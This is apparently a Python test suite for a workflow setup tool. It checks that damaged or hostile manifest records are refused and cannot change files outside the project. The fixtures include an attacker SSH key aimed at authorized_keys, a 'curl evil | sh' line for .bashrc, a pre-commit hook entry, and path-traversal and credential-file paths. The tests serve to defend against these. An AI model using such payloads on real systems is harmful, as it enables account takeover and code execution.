"""A record is data from the disk (B2, S6, S7): whatever it holds, setup
refuses it in one line or handles it, and a project's record can change
nothing but the project.

Run from the repository root:
    python -m unittest discover -s tools/setup/tests
"""
from __future__ import annotations

import copy
import hashlib
import json
import os
import random
import tempfile
import threading
import unittest
from pathlib import Path

import support
from crash_support import Disk, World, clear, differences, tree
from wfsetup import fileops, fsio, jsonkeys
from wfsetup.errors import EXIT_ERROR, SetupError
from wfsetup.manifest import BACKUPS_KEY, HOME, PROJECT, PROJECT_BACKUPS_KEY, Manifest

STATE = "home/.agents/workflow-setup"
STAMP = "20260101TT00001Z"


def digest(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


class RecordCase(unittest.TestCase):
    """An installed home and project, and a directory beside them that
    is outside every root."""

    def setUp(self) -> None:
        scratch = tempfile.TemporaryDirectory()
        self.addCleanup(scratch.cleanup)
        self.base = Path(scratch.name).resolve()
        self.addCleanup(clear, self.base)
        self.count = 0
        self.fresh()

    def fresh(self) -> None:
        """A new world, installed by one run whose stamp is ``STAMP``."""
        if self.count:
            clear(self.top)
        self.count += 1
        self.top = self.base / f"c{self.count}"
        self.world = World(self.top / "w")
        with Disk():  # not waiting for the disk to sync
            self.world.reset()
            self.world.everything().apply()
        (self.top / "outside").mkdir()
        (self.top / "outside" / "keep.txt").write_bytes(b"outside every root\n")
        self.roots = self.world.roots
        self.home_file = self.roots.manifest_file
        self.project_file = self.roots.project_manifest_file

    def data(self, file: Path) -> dict:
        return json.loads(file.read_bytes())

    def write(self, file: Path, data: object) -> None:
        file.write_bytes(data if isinstance(data, bytes) else json.dumps(data).encode("utf-8"))

    def runs(self) -> dict:
        """Everything a command does with a record."""
        return {
            "read": lambda: fileops.read_record(self.roots),
            "leftovers": lambda: fileops.leftovers(self.roots),
            "undo project, dry": lambda: fileops.plan_reversal(self.roots, project=True, stamp=self.world.stamp()).describe(),
            "undo home, dry": lambda: fileops.plan_reversal(self.roots, stamp=self.world.stamp()).describe(),
            "undo project": lambda: fileops.plan_reversal(self.roots, project=True, stamp=self.world.stamp()).apply(),
            "undo home": lambda: fileops.plan_reversal(self.roots, stamp=self.world.stamp()).apply(),
            "render": lambda: self.world.everything().apply(),
            "remove project state": lambda: fileops.remove_state(self.roots, project=True),
            "remove home state": lambda: fileops.remove_state(self.roots),
        }

    def outside(self) -> dict:
        return tree(self.top / "outside")

    def nothing_left_named(self) -> None:
        """``leftovers`` is what ``doctor`` reads beside the record: of a
        record that is refused it names nothing, and says so by an empty
        answer; the refusal itself is ``read_record``'s to give."""
        self.assertEqual(list(fileops.leftovers(self.roots)), [])

    def refused_whole(self, file: Path, *words: str) -> None:
        """Every run that reads the record at ``file`` is refused in one
        line that names it, and nothing at all is changed."""
        before = tree(self.top)
        involved = [name for name in self.runs() if file == self.home_file or "home" not in name]
        for name in involved:
            with self.subTest(run=name):
                if name == "leftovers":
                    self.nothing_left_named()
                    continue
                with self.assertRaises(SetupError) as caught:
                    self.runs()[name]()
                self.assertEqual(len(caught.exception.lines), 1, caught.exception.lines)
                line = caught.exception.lines[0]
                self.assertTrue(line.startswith(f"{file}: is not a setup record: "), line)
                for word in words:
                    self.assertIn(word, line)
        self.assertEqual(differences(before, tree(self.top)), [])


class ProjectRecordTests(RecordCase):
    """What a project's record, which travels with a checkout, may name."""

    def hostile(self) -> dict[str, dict]:
        payload = b"ssh-rsa AAAA-ATTACKER attacker@evil\n"
        (self.world.project / "payload").write_bytes(payload)
        mine = (self.world.home / ".claude" / "agents" / "coder.md").read_bytes()
        return {
            # A file "put back" into the home from a "backup" in the project.
            "home:.ssh/authorized_keys": {"kind": "removed-file", "original": {
                "backup": "project:payload", "sha256": digest(payload), "mode": 0o600}},
            # Lines "put back" into a file of the home.
            "home:.bashrc": {"kind": "text", "sha256": "0" * 64, "created": False, "original": None, "syntax": None,
                             "blocks": {}, "removed_lines": [[{"index": 0, "text": "curl evil | sh", "eol": "\n"}]]},
            # A link "put back" in the home.
            "home:.claude/skills/evil": {"kind": "removed-link", "target": "raw:/tmp/evil-skill", "directory": True},
            # A key of the user's own settings "restored".
            "home:.claude/settings.json": {"kind": "json", "sha256": "0" * 64, "created": False, "original": None,
                                           "keys": {"model": {"value": "opus", "had": True, "previous": "ATTACKER"}}},
            # The user's own link and file claimed as setup's, for a render to remove.
            "home:.claude/skills/users-own": {"kind": "link", "target": "raw:" + str(self.world.home / "elsewhere")},
            "home:.claude/agents/coder.md": {"kind": "file", "sha256": digest(mine), "inputs": "x", "original": None},
            # A directory of the home claimed as created by setup.
            "home:.claude": {"kind": "directory"},
            # The clone, a root, another root, setup's own state.
            "clone:json-tools/SKILL.md": {"kind": "file", "sha256": "0" * 64, "inputs": None, "original": None},
            "project:.": {"kind": "directory"},
            "elsewhere:x": {"kind": "directory"},
            "project:.agents/workflow-setup/manifest.json": {"kind": "file", "sha256": "0" * 64, "original": None},
            # Anything under a .git directory.
            "project:.git/hooks/pre-commit": {"kind": "file", "sha256": "0" * 64, "inputs": None, "original": None},
        }

    def test_an_entry_outside_the_project_refuses_the_record(self) -> None:
        (self.world.home / ".bashrc").write_bytes(b"# the user's\n")
        (self.world.home / ".claude" / "settings.json").write_bytes(b'{"model": "opus"}\n')
        for key in list(self.hostile()):
            with self.subTest(key=key):
                self.fresh()
                (self.world.home / ".bashrc").write_bytes(b"# the user's\n")
                (self.world.home / ".claude" / "settings.json").write_bytes(b'{"model": "opus"}\n')
                entry = self.hostile()[key]
                data = self.data(self.project_file)
                data["entries"][key] = entry
                self.write(self.project_file, data)
                self.refused_whole(self.project_file, f"entry {key}: ")
                # The command line: one line, exit 2, nothing done.
                before = tree(self.top)
                for argv in (["uninstall"], ["uninstall", "--dry-run"]):
                    code, out, err = support.run(*argv, "--home", str(self.world.home), "--project", str(self.world.project))
                    self.assertEqual(code, EXIT_ERROR, (out, err))
                    self.assertEqual(len(err.splitlines()), 1, err)
                    self.assertIn(f"entry {key}: ", err)
                self.assertEqual(differences(before, tree(self.top)), [])

    def test_a_pending_change_or_a_backup_outside_the_project_refuses_it(self) -> None:
        cases = {
            "pending": {"pending": [{"path": "home:.bashrc", "after": {"kind": "absent"}, "set": True, "entry": None, "backup": None}]},
            "pending entry": {"pending": [{"path": "project:x", "after": None, "set": True, "backup": None,
                                           "entry": {"kind": "removed-file", "original": {
                                               "backup": f"{BACKUPS_KEY}/{STAMP}/home/.codex/config.toml", "sha256": "0" * 64, "mode": None}}}]},
            "pending backup": {"pending": [{"path": "project:x", "after": None, "set": False, "entry": None, "backup": {
                "path": "home:.codex/config.toml", "kind": "file", "backup": f"{BACKUPS_KEY}/{STAMP}/home/.codex/config.toml",
                "sha256": "0" * 64, "mode": None, "stamp": STAMP}}]},
            "backup": {"backups": [{"path": "home:.codex/config.toml", "kind": "file", "sha256": "0" * 64, "mode": None,
                                    "backup": f"{BACKUPS_KEY}/{STAMP}/home/.codex/config.toml", "stamp": STAMP}]},
            "backup link": {"backups": [{"path": "home:.claude/skills/x", "kind": "link", "target": "raw:/x", "directory": True}]},
        }
        for name, change in cases.items():
            with self.subTest(name):
                self.fresh()
                data = self.data(self.project_file)
                for key, value in change.items():
                    data[key] = [*data.get(key, []), *value]
                self.write(self.project_file, data)
                self.refused_whole(self.project_file)

    def test_a_backup_is_read_only_where_setup_wrote_it_for_that_path(self) -> None:
        """The backups of the home hold full copies of the user's files,
        the Codex settings with every key among them. No entry of a
        project can name one of them, or anything else, as its own."""
        secret = self.world.home / ".agents" / "workflow-setup" / "backups" / STAMP / "home" / ".codex" / "config.toml"
        self.assertTrue(secret.is_file(), "the template has the backup this test is about")
        sha = digest(secret.read_bytes())
        references = {
            "the home's backup": f"{BACKUPS_KEY}/{STAMP}/home/.codex/config.toml",
            "this path's backup, in the home's state": f"{BACKUPS_KEY}/{STAMP}/project/stolen.toml",
            "another project path's backup": f"{PROJECT_BACKUPS_KEY}/{STAMP}/project/.gitignore",
            "a file of the project": "project:payload",
            "a file of the home": "home:.codex/config.toml",
            "up and out": f"{PROJECT_BACKUPS_KEY}/{STAMP}/project/../home/.codex/config.toml",
            "up and out of the project": f"{PROJECT_BACKUPS_KEY}/{STAMP}/project/../../../../../../home/.codex/config.toml",
            "no stamp": f"{PROJECT_BACKUPS_KEY}//project/stolen.toml",
            "the clone": "clone:json-tools/SKILL.md",
            "not text": 5,
        }
        for name, backup in references.items():
            with self.subTest(name):
                self.fresh()
                (self.world.project / "payload").write_bytes(b"x\n")
                data = self.data(self.project_file)
                data["entries"]["project:stolen.toml"] = {
                    "kind": "removed-file", "original": {"backup": backup, "sha256": sha, "mode": 0o644},
                }
                self.write(self.project_file, data)
                self.refused_whole(self.project_file, "entry project:stolen.toml: its backup is not ")
                self.assertFalse((self.world.project / "stolen.toml").exists())
        # The one reference it may hold: the backup of that very path.
        self.fresh()
        data = self.data(self.project_file)
        data["entries"]["project:stolen.toml"] = {"kind": "removed-file", "original": {
            "backup": f"{PROJECT_BACKUPS_KEY}/{STAMP}/project/stolen.toml", "sha256": sha, "mode": 0o644}}
        self.write(self.project_file, data)
        result = fileops.plan_reversal(self.roots, project=True, stamp=self.world.stamp()).apply()
        self.assertIn("project:stolen.toml", [key for key, _ in result.kept])  # no such backup: kept, nothing written
        self.assertFalse((self.world.project / "stolen.toml").exists())

    def test_the_user_level_record_names_no_path_of_a_project(self) -> None:
        for key, entry in {
            "project:src/main.py": {"kind": "file", "sha256": digest(b"print(1)\n"), "inputs": None, "original": None},
            "project:.gitignore": {"kind": "removed-file", "original": None},
        }.items():
            with self.subTest(key=key):
                self.fresh()
                data = self.data(self.home_file)
                data["entries"][key] = entry
                self.write(self.home_file, data)
                self.refused_whole(self.home_file, f"entry {key}: the user-level record lists no path of a project")

    def test_removing_a_projects_state_removes_only_backups_of_the_project(self) -> None:
        """``_remove_backups_of`` acts on a record: it removes nothing
        that is not a project's backup, whatever the record lists."""
        victim = self.world.home / ".claude" / "CLAUDE.md"
        homes = self.world.home / ".agents" / "workflow-setup" / "backups" / STAMP / "home" / ".claude" / "CLAUDE.md"
        self.assertTrue(homes.is_file())
        manifest = Manifest(self.project_file, PROJECT)
        manifest.backups = [
            {"path": "project:x", "kind": "file", "backup": "home:.claude/CLAUDE.md"},
            {"path": "project:x", "kind": "file", "backup": f"{BACKUPS_KEY}/../../../.claude/CLAUDE.md"},
            {"path": "project:x", "kind": "file", "backup": f"{BACKUPS_KEY}/{STAMP}/home/.claude/CLAUDE.md"},
            {"path": "project:x", "kind": "file", "backup": f"{PROJECT_BACKUPS_KEY}/../../../src/main.py"},
            {"path": "project:x", "kind": "file", "backup": f"{PROJECT_BACKUPS_KEY}/../../../../home/.claude/CLAUDE.md"},
            {"path": "project:x", "kind": "file", "backup": "project:src/main.py"},
            {"path": "project:x", "kind": "file", "backup": 7},
        ]
        before = tree(self.top)
        fileops._remove_backups_of(self.roots, manifest)
        self.assertEqual(differences(before, tree(self.top)), [])
        self.assertTrue(victim.is_file())


class DamagedRecordTests(RecordCase):
    """Records damaged by hand: each is refused in one line or handled;
    none ends in anything but a ``SetupError``, and none writes outside."""

    def mutations(self):
        def first(data: dict, *kinds: str) -> tuple[str, dict]:
            for key, entry in data["entries"].items():
                if entry["kind"] in kinds:
                    return key, entry
            raise AssertionError(kinds)

        def add(key: str, entry: object):
            return lambda data: data["entries"].update({key: entry})

        yield "newer schema", lambda data: data.update(schema_version=2), "written by a newer setup"
        yield "schema a fraction", lambda data: data.update(schema_version=1.0), "no schema_version"
        yield "entries a list", lambda data: data.update(entries=[]), "not in the form"
        yield "backups a table", lambda data: data.update(backups={}), "not in the form"
        yield "pending text", lambda data: data.update(pending="x"), "not in the form"
        yield "an entry that is text", add("home:x", "text"), "not an entry with a kind"
        yield "a kind that is a number", add("home:x", {"kind": 3}), "not an entry with a kind"
        yield "up and out", add("home:../../escape-x", {"kind": "removed-file", "original": None}), "not a path"
        yield "an absolute path", add("home:/etc/zzz", {"kind": "file", "sha256": "0"}), "not a path"
        yield "a drive", add("home:C:/x", {"kind": "file", "sha256": "0"}), "not a path"
        yield "a backslash", add("home:a\\..\\b", {"kind": "directory"}), "not a path"
        yield "no anchor", add("justtext", {"kind": "file", "sha256": "0"}), "not a path"
        yield "raw as an anchor", add("raw:/etc/passwd", {"kind": "directory"}), "not a path"
        yield "a root", add("home:.", {"kind": "directory"}), "a root itself"
        yield "the clone", add("clone:json-tools", {"kind": "directory"}), "the clone"
        yield "setup's state", add("home:.agents/workflow-setup/manifest.json", {"kind": "file", "sha256": "0"}), "own state"
        yield "credentials", add("home:.claude/.credentials.json", {"kind": "file", "sha256": "0", "original": None}), "credentials"
        yield "credentials, other case", add("home:.codex/AUTH.JSON", {"kind": "removed-file", "original": None}), "credentials"
        yield "a link without a target", lambda data: first(data, "link")[1].pop("target"), "its target is not text"
        yield "a link target that is a number", lambda data: first(data, "link")[1].update(target=5), "its target is not text"
        yield "a link target that leads out", lambda data: first(data, "link")[1].update(target="clone:../x"), "its target is not a path"
        yield "replaced that is text", lambda data: first(data, "link")[1].update(replaced="text"), "took the place of"
        yield "replaced of another kind", lambda data: first(data, "link")[1].update(replaced={"kind": "file"}), "took the place of"
        yield "blocks a list", lambda data: first(data, "text")[1].update(blocks=[1]), "its blocks are not a table"
        yield "a block without a hash", lambda data: first(data, "text")[1].update(blocks={"": "x"}), "has no hash"
        yield "removed lines text", lambda data: first(data, "text")[1].update(removed_lines="abc"), "removed lines"
        yield "a removed line of numbers", lambda data: first(data, "text")[1].update(
            removed_lines=[[{"index": "x", "text": 5}]]), "a removed line is not"
        yield "a removed line of two lines", lambda data: first(data, "text")[1].update(
            removed_lines=[[{"index": 0, "text": "a\nb", "eol": "\n"}]]), "a removed line is not"
        yield "created a number", lambda data: first(data, "text")[1].update(created=1), "created mark"
        yield "original text", lambda data: first(data, "text")[1].update(original="str"), "its backup is not in the form"
        yield "original that leads out", lambda data: first(data, "text")[1].update(
            original={"backup": "home:../../../etc/hostname", "sha256": "0" * 64, "mode": None}), "its backup is not under"
        yield "original without a hash", lambda data: first(data, "text")[1]["original"].pop("sha256"), "has no hash"
        yield "original with a text mode", lambda data: first(data, "text")[1]["original"].update(mode="0644"), "mode is not a number"
        yield "a hash that is a list", lambda data: first(data, "file")[1].update(sha256=[1]), "its hash is not text"
        yield "inputs a number", lambda data: first(data, "file")[1].update(inputs=5), "inputs digest"
        yield "a removed file whose original is text", lambda data: first(data, "removed-file")[1].update(original="x"), "its backup"
        yield "a removed link without a target", add("home:x", {"kind": "removed-link", "directory": True}), "its target"
        yield "a removed directory with a text mode", add("home:x", {"kind": "removed-directory", "mode": "x"}), "its mode"
        yield "keys text", add("home:x.json", {"kind": "json", "sha256": "0", "keys": "notatable"}), "its keys are not a table"
        yield "a key that is text", add("home:x.json", {"kind": "json", "sha256": "0", "keys": {"model": "x"}}), "its key model"
        yield "a pending change that is a number", lambda data: data.update(pending=[5]), "pending change 1"
        yield "a pending change without a path", lambda data: data.update(
            pending=[{"set": True, "entry": {"kind": "file"}}]), "pending change 1 (null): not a path"
        yield "a pending path that is a number", lambda data: data.update(
            pending=[{"path": 5, "after": {"kind": "file"}}]), "pending change 1 (5): not a path"
        yield "a pending path that leads out", lambda data: data.update(
            pending=[{"path": "home:../x", "after": {"kind": "directory"}, "set": True, "entry": {"kind": "directory"}}]), "not a path"
        yield "a pending state of no kind", lambda data: data.update(
            pending=[{"path": "home:x", "after": {"kind": "socket"}}]), "the state it was to leave"
        yield "a pending file without a hash", lambda data: data.update(
            pending=[{"path": "home:x", "after": {"kind": "file"}}]), "has no hash"
        yield "a pending entry of bad form", lambda data: data.update(
            pending=[{"path": "home:x", "after": None, "set": True, "entry": {"kind": "link"}}]), "its target is not text"
        yield "a pending half-way entry of bad form", lambda data: data.update(
            pending=[{"path": "home:x", "after": None, "between": {"entry": {"kind": "link", "target": 1}}}]), "its target"
        yield "a backup that is text", lambda data: data["backups"].append("x"), "not a backup"
        yield "a backup of no kind", lambda data: data["backups"].append({"path": "home:x", "kind": "pipe"}), "neither a file nor a link"
        yield "a backup elsewhere", lambda data: data["backups"].append(
            {"path": "home:x", "kind": "file", "backup": "home:x", "sha256": "0" * 64, "mode": None}), "its backup is not under"

    def test_each_is_refused_in_one_line_that_names_the_file_and_the_entry(self) -> None:
        count = 0
        for name, change, words in self.mutations():
            with self.subTest(name):
                self.fresh()
                data = self.data(self.home_file)
                change(data)
                self.write(self.home_file, data)
                before = tree(self.top)
                with self.assertRaises(SetupError) as caught:
                    fileops.read_record(self.roots)
                self.assertEqual(len(caught.exception.lines), 1)
                line = caught.exception.lines[0]
                self.assertTrue(line.startswith(f"{self.home_file}: "), line)
                self.assertIn(words, line)
                self.assertNotIn("\n", line)
                for name_of_run, run in self.runs().items():
                    if "project state" in name_of_run:
                        continue
                    if name_of_run == "leftovers":
                        self.nothing_left_named()
                        continue
                    with self.assertRaises(SetupError, msg=name_of_run):
                        run()
                self.assertEqual(differences(before, tree(self.top)), [], name)
                count += 1
        self.assertGreater(count, 45)

    def test_the_same_on_the_command_line(self) -> None:
        picked = [item for item in self.mutations() if item[0] in (
            "a link without a target", "blocks a list", "keys text", "original text", "a pending change without a path",
            "up and out", "a link target that is a number",
        )]
        self.assertEqual(len(picked), 7)
        for name, change, words in picked:
            with self.subTest(name):
                self.fresh()
                data = self.data(self.home_file)
                change(data)
                self.write(self.home_file, data)
                before = tree(self.top)
                for argv in (["uninstall"], ["uninstall", "--dry-run"]):
                    code, out, err = support.run(*argv, "--home", str(self.world.home))
                    self.assertEqual(code, EXIT_ERROR, (name, out, err))
                    self.assertEqual(len(err.splitlines()), 1, err)
                    self.assertTrue(err.startswith(f"error: {self.home_file}: is not a setup record: "), err)
                self.assertEqual(differences(before, tree(self.top)), [])

    def test_files_that_are_not_records_at_all(self) -> None:
        raws = {
            "cut short": self.home_file.read_bytes()[:500],
            "empty": b"",
            "not UTF-8": b"\xff\xfe{}",
            "a list": b"[]",
            "nested too deeply": b"[" * 200000,
            "a number": b"1",
            "null": b"null",
        }
        for name, raw in raws.items():
            with self.subTest(name):
                self.fresh()
                self.write(self.home_file, raw)
                self.refused_whole(self.home_file)
                self.assertEqual(self.home_file.read_bytes(), raw)

    def test_a_record_that_is_handled(self) -> None:
        """Damage that leaves a record setup can act on: nothing but a
        ``SetupError`` comes of any run, and nothing outside is written."""
        def backups_gone(data: dict) -> None:
            clear(self.roots.backups_dir)

        def backup_damaged(data: dict) -> None:
            for path in self.roots.backups_dir.rglob("CLAUDE.md"):
                path.write_bytes(b"damaged")

        cases = {
            "a kind of a later setup": lambda data: data["entries"].update({"home:.claude/zzz": {"kind": "mystery", "x": [1]}}),
            "a root this run was not given": lambda data: data["entries"].update({"other:x": {"kind": "file", "sha256": "0"}}),
            "directories of the user's claimed": lambda data: data["entries"].update(
                {"home:.claude": {"kind": "directory"}, "home:.codex": {"kind": "directory"}}),
            "the backups removed": backups_gone,
            "a backup damaged": backup_damaged,
            "a wrong hash": lambda data: [entry.update(sha256="0" * 64) for entry in data["entries"].values() if "sha256" in entry],
            "no entries at all": lambda data: data.update(entries={}),
            "a pending change under a root not given": lambda data: data.update(
                pending=[{"path": "other:x", "after": {"kind": "absent"}, "set": True, "entry": None, "backup": None}]),
        }
        for name, change in cases.items():
            for run in self.runs():
                with self.subTest(case=name, run=run):
                    self.fresh()
                    data = self.data(self.home_file)
                    change(data)
                    self.write(self.home_file, data)
                    try:
                        self.runs()[run]()
                    except SetupError as exc:
                        self.assertTrue(all(line and "\n" not in line for line in exc.lines), exc.lines)
                    self.assertEqual(self.outside(), {"keep.txt": ("file", b"outside every root\n", self.outside()["keep.txt"][2])})
                    self.assertEqual(sorted(os.listdir(self.top)), ["outside", "w"])
        # What the user holds in a directory setup did not create stays.
        self.fresh()
        data = self.data(self.home_file)
        data["entries"]["home:.codex"] = {"kind": "directory"}
        self.write(self.home_file, data)
        self.world.uninstall()
        self.assertEqual((self.world.home / ".codex" / "config.toml").read_bytes(), World.CONFIG_TOML)

    JUNK = [
        None, True, False, 0, 5, -1, 1.5, "", "x", "home:../../x", "project:.", "home:.", "raw:/etc/passwd", "clone:x",
        "home:.claude/CLAUDE.md", [], {}, [1], [[{}]], {"kind": 3}, {"kind": "link"}, {"kind": "file"}, "\x00", "a" * 3000,
        {"backup": "home:x"}, {"entry": None}, ["x", {"index": -1}],
    ]

    def spots(self, node: object, path: tuple = ()) -> list[tuple]:
        found = [path] if path else []
        if isinstance(node, dict):
            for key, value in node.items():
                found += self.spots(value, (*path, key))
        elif isinstance(node, list):
            for index, value in enumerate(node):
                found += self.spots(value, (*path, index))
        return found

    def test_random_damage(self) -> None:
        """Any one value of a record replaced by junk, or removed: reading
        it and planning with it never ends in anything but a refusal, and
        a project's record so damaged never changes the home."""
        rng = random.Random(20261005)
        home, project = self.data(self.home_file), self.data(self.project_file)
        # A pending list too, so that its form is damaged as well.
        for data in (home, project):
            anchor = HOME if data is home else PROJECT
            data["pending"] = [{"path": f"{anchor}:p/{index}", "after": after, "set": True, "entry": None, "backup": None}
                               for index, after in enumerate([None, {"kind": "absent"}, {"kind": "directory"}])]
        refused = accepted = 0
        for trial in range(400):
            which = rng.choice(["home", "project"])
            data = copy.deepcopy(home if which == "home" else project)
            spot = rng.choice(self.spots(data))
            node = data
            for part in spot[:-1]:
                node = node[part]
            if rng.random() < 0.2:
                del node[spot[-1]]
            else:
                node[spot[-1]] = copy.deepcopy(rng.choice(self.JUNK))
            file = self.home_file if which == "home" else self.project_file
            original = file.read_bytes()
            self.write(file, data)
            before = tree(self.top)
            with self.subTest(trial=trial, which=which, spot=spot):
                try:
                    fileops.read_record(self.roots)
                    fileops.leftovers(self.roots)
                    for is_project in (True, False):
                        fileops.plan_reversal(self.roots, project=is_project, stamp=self.world.stamp()).describe()
                    self.world.everything().describe()
                    accepted += 1
                except SetupError as exc:
                    self.assertTrue(all(line and "\n" not in line for line in exc.lines), exc.lines)
                    refused += 1
                self.assertEqual(differences(before, tree(self.top)), [], "a dry run or a refusal wrote something")
                if trial % 8 == 0:
                    # And for real, on a copy: whatever a damaged record of
                    # the project does, it does to the project.
                    self.fresh()
                    file = self.home_file if which == "home" else self.project_file
                    self.write(file, data)
                    users = lambda: {name: value for name, value in tree(self.top).items()  # noqa: E731
                                     if which == "project" and name.startswith("w/home/") and not name.startswith(f"w/{STATE}")}
                    held = users()
                    try:
                        fileops.plan_reversal(self.roots, project=which == "project", stamp=self.world.stamp()).apply()
                        fileops.remove_state(self.roots, project=which == "project")
                    except SetupError:
                        pass
                    self.assertEqual(differences(held, users()), [])
                    self.assertEqual(sorted(os.listdir(self.top)), ["outside", "w"])
                    self.assertEqual((self.top / "outside" / "keep.txt").read_bytes(), b"outside every root\n")
                    self.fresh()
                else:
                    file.write_bytes(original)
        self.assertGreater(refused, 150)
        self.assertGreater(accepted, 20)


class NotAFileTests(RecordCase):
    """What is read is looked at before it is opened (S7): a FIFO where a
    record is expected would be waited on for ever."""

    def quickly(self, run) -> BaseException | None:
        """The outcome of ``run`` within a few seconds, or a failure."""
        outcome: list = []

        def work() -> None:
            try:
                run()
                outcome.append(None)
            except BaseException as exc:  # noqa: BLE001
                outcome.append(exc)

        thread = threading.Thread(target=work, daemon=True)
        thread.start()
        thread.join(15)
        if thread.is_alive():
            self.fail("the run waits on a file that is not one")
        return outcome[0]

    @unittest.skipUnless(hasattr(os, "mkfifo"), "this system has no FIFO to put there")
    def test_a_fifo_where_a_record_is_expected_is_refused_at_once(self) -> None:
        for file in (self.home_file, self.project_file):
            with self.subTest(file=file.name):
                self.fresh()
                file = self.home_file if file.name == self.home_file.name else self.project_file
                file.unlink()
                os.mkfifo(file)
                for name, run in self.runs().items():
                    if "state" in name or (file == self.project_file and "home" in name and "undo" not in name):
                        continue
                    if name == "leftovers":
                        self.assertIsNone(self.quickly(self.nothing_left_named))
                        continue
                    found = self.quickly(run)
                    self.assertIsInstance(found, SetupError, name)
                    self.assertEqual(len(found.lines), 1)
                    self.assertIn(str(file), found.lines[0])
                    self.assertIn("is not a setup record: it is not a file", found.lines[0])
                code, out, err = None, "", ""

                def command() -> None:
                    nonlocal code, out, err
                    code, out, err = support.run("uninstall", "--dry-run", "--home", str(self.world.home),
                                                 "--project", str(self.world.project))

                self.assertIsNone(self.quickly(command))
                self.assertEqual(code, EXIT_ERROR)
                self.assertEqual(len(err.splitlines()), 1, err)

    @unittest.skipUnless(hasattr(os, "mkfifo"), "this system has no FIFO to put there")
    def test_a_fifo_is_never_opened_by_the_reads_of_this_layer(self) -> None:
        fifo = self.top / "fifo"
        os.mkfifo(fifo)
        for run in (lambda: fsio.read_bytes(fifo), lambda: jsonkeys.load_key_list(fifo), lambda: Manifest.load(fifo)):
            found = self.quickly(run)
            self.assertIsInstance(found, SetupError)
            self.assertEqual(len(found.lines), 1)
        self.assertFalse(fsio.is_file(fifo))
        # In a home: a FIFO where a file is planned is a conflict, unopened.
        target = self.world.home / ".claude" / "agents" / "pipe.md"
        os.mkfifo(target)
        plan = self.world.plan()
        plan.write_file(target, "x\n")
        found = self.quickly(plan.apply)
        self.assertIsInstance(found, fileops.PlanError)

    def test_a_directory_where_a_record_is_expected(self) -> None:
        self.home_file.unlink()
        self.home_file.mkdir()
        with self.assertRaises(SetupError) as caught:
            fileops.read_record(self.roots)
        self.assertEqual(caught.exception.lines, [f"{self.home_file}: is not a setup record: it is a directory"])

    def test_a_link_that_leads_nowhere_is_no_record(self) -> None:
        if not hasattr(os, "symlink"):
            self.skipTest("no links")
        self.home_file.unlink()
        try:
            os.symlink(self.top / "nowhere", self.home_file)
        except (OSError, NotImplementedError):
            self.skipTest("this account cannot make a link to a file")
        self.assertFalse(fileops.read_record(self.roots).home.on_disk)


class SettlingTests(RecordCase):
    """How a pending change of an interrupted run is settled (B1)."""

    def pending(self, *items: dict) -> None:
        data = self.data(self.home_file)
        data["pending"] = list(items)
        self.write(self.home_file, data)

    def test_a_change_whose_backup_was_never_written_was_not_made(self) -> None:
        """Every backup of a run is written before its first change. A
        file that holds what the change was to write, while the backup of
        what it replaced is not there, got those bytes from someone else."""
        file = self.world.home / "theirs.md"
        file.write_bytes(b"what the run was to write\n")
        backup = f"{BACKUPS_KEY}/S7/home/theirs.md"
        reference = {"backup": backup, "sha256": digest(b"before\n"), "mode": 0o644}
        item = {
            "path": "home:theirs.md", "after": {"kind": "file", "sha256": digest(file.read_bytes())}, "set": True,
            "entry": {"kind": "file", "sha256": digest(file.read_bytes()), "inputs": None, "original": reference},
            "backup": {"path": "home:theirs.md", "kind": "file", **reference, "stamp": "S7"},
        }
        self.pending(item)
        record = fileops.read_record(self.roots)
        self.assertEqual((record.recovered, record.dropped_paths), (0, ["home:theirs.md"]))
        self.assertIsNone(record.get("home:theirs.md"))
        # With the backup there, the same change was made.
        self.world.put(self.roots.path(backup), "before\n")
        record = fileops.read_record(self.roots)
        self.assertEqual(record.recovered_paths, ["home:theirs.md"])
        self.assertEqual(record.get("home:theirs.md")["original"], reference)

    def removal(self, there: bytes) -> tuple[str, dict, dict, Path]:
        """A pending removal of a file of the user's whose backup was
        written, and ``there`` at the path now."""
        file = self.world.home / "mine.md"
        file.write_bytes(there)
        key, backup = "home:mine.md", f"{BACKUPS_KEY}/S7/home/mine.md"
        reference = {"backup": backup, "sha256": digest(b"before\n"), "mode": 0o644}
        listed = {"path": key, "kind": "file", **reference, "stamp": "S7"}
        entry = {"kind": "removed-file", "original": reference}
        self.pending({"path": key, "after": {"kind": "absent"}, "set": True, "entry": entry, "backup": listed})
        return key, entry, listed, self.world.put(self.roots.path(backup), "before\n")

    def test_a_removal_whose_path_holds_something_else_again_keeps_its_entry_and_its_backup(self) -> None:
        """The file was removed and another is there since: the backup is
        the only copy of the user's file, so the change counts as made."""
        key, entry, listed, backup = self.removal(b"put there since\n")
        record = fileops.read_record(self.roots)
        self.assertEqual((record.recovered_paths, record.dropped_paths), ([key], []))
        self.assertEqual(record.get(key), entry)
        self.assertIn(listed, record.backups)
        self.assertEqual(backup.read_bytes(), b"before\n")

    def test_a_removal_that_was_not_made_keeps_its_backup_listed(self) -> None:
        """The path holds the very bytes of the backup: the removal was not
        made. Its backup stays on disk and stays listed; the next run that
        writes saves that, and removes nothing under the backups."""
        key, entry, listed, backup = self.removal(b"before\n")
        record = fileops.read_record(self.roots)
        self.assertEqual((record.recovered_paths, record.dropped_paths), ([], [key]))
        self.assertIsNone(record.get(key))
        self.assertIn(listed, record.backups)
        plan = self.world.plan()
        plan.write_file(self.world.home / "new.md", "x\n")
        plan.apply()
        self.assertIn(listed, self.data(self.home_file)["backups"])
        self.assertNotIn("pending", self.data(self.home_file))
        self.assertEqual(backup.read_bytes(), b"before\n")
        self.assertEqual((self.world.home / "mine.md").read_bytes(), b"before\n")

    def test_a_backup_no_record_lists_is_left_alone_and_named(self) -> None:
        stray = self.world.put(self.roots.backups_dir / "S0" / "home" / "stray.md", "whose?\n")
        self.assertEqual(fileops.unlisted_backups(self.roots), [stray])
        self.assertEqual(fileops.leftovers(self.roots).unlisted, [stray])
        plan = self.world.plan()
        plan.write_file(self.world.home / "new.md", "x\n")
        result = plan.apply()
        self.assertTrue(any("1 backup under" in note and "that no record lists was left as it is" in note
                            and "uninstall --discard-backups" in note for note in result.notes), result.notes)
        self.assertEqual(stray.read_bytes(), b"whose?\n")
        # The way back removes the record and the backups it lists, and
        # not this one: the state directory stays, with it alone.
        self.assertEqual(self.world.uninstall(), [])
        self.assertEqual(stray.read_bytes(), b"whose?\n")
        self.assertEqual(
            sorted(tree(self.roots.state_dir)), ["backups", "backups/S0", "backups/S0/home", "backups/S0/home/stray.md"]
        )
        self.assertFalse(self.roots.project_state_dir.exists())

